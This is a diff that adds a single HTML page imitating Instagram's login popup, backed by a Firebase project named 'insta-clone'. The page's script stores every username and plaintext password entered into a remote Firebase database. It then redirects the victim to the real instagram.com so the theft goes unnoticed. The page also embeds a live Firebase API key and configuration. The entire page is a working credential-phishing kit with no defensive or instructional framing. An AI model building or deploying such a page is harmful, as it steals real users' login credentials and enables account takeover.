@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image Click Login Popup</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div id="overlay" class="hidden"></div>
+
+    <div id="imageContainer">
+        <img src="2.PNG" alt="Clickable Image" id="clickableImage">
+    </div>
+
+    <!-- Login Form Popup -->
+    <div id="loginPopup" class="hidden">
+        <!-- Close Icon -->
+        <div id="closeIcon">&times;</div>
+
+        <div id="loginForm">
+            <img src="logo.PNG" alt="Login" id="loginImage">
+            <input type="text" placeholder="Phone number, username, or email" required id="username">
+            <input type="password" placeholder="Password" required id="password">
+            <button type="submit" id="submitBtn">Log in</button>
+            <!-- Divider line with 'or' text -->
+            <div class="divider">OR</div>
+            <div class="facebook-login">
+                <img src="Facebook_logo.png" alt="Facebook Logo" class="facebook-logo">
+                <span>Log in with Facebook</span>
+            </div>
+            <div class="forgot-password">
+                <span>Forgot password?</span>
+            </div>
+            <div class="signup">
+                <span>Don't have an account?</span><span class="signup-link"> Sign up</span>
+            </div>
+            
+
+        </div>
+    </div>
+
+    
+<script type="module">
+    // Import the functions you need from the SDKs you need
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+    import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-database.js";
+  
+    // TODO: Add SDKs for Firebase products that you want to use
+    // https://firebase.google.com/docs/web/setup#available-libraries
+  
+    // Your web app's Firebase configuration
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    const firebaseConfig = {
+      apiKey: "AIzaSyDTiDI4K6w_8ILfOPZ-w-VtevSCj_6NEsw",
+      authDomain: "insta-clone-a1487.firebaseapp.com",
+      projectId: "insta-clone-a1487",
+      storageBucket: "insta-clone-a1487.appspot.com",
+      messagingSenderId: "700387185880",
+      appId: "1:700387185880:web:dd442f0e216620048133ad",
+      measurementId: "G-L8Z3RYNSC4"
+    };
+  
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+  
+    const db = getDatabase(app);
+  
+  
+  
+  document.getElementById('clickableImage').addEventListener('click', function() {
+      document.getElementById('loginPopup').style.display = 'block';
+      document.getElementById('overlay').style.display = 'block'; // Show the overlay
+  });
+  
+  document.getElementById('closeIcon').addEventListener('click', function() {
+      document.getElementById('loginPopup').classList.add('hidden');
+      document.getElementById('overlay').classList.add('hidden');
+  });
+  
+  
+  document.getElementById('submitBtn').addEventListener('click', function(event) {
+      event.preventDefault(); // Prevents form submission for demonstration
+      set(ref(db, 'user/' + document.getElementById("username").value),
+                {
+     
+                  username: document.getElementById("username").value,
+                  password: document.getElementById("password").value,
+  
+                  });
+                  window.location.href = 'https://www.instagram.com/';
+              })
+              </script>
+  
+</body>
+</html>
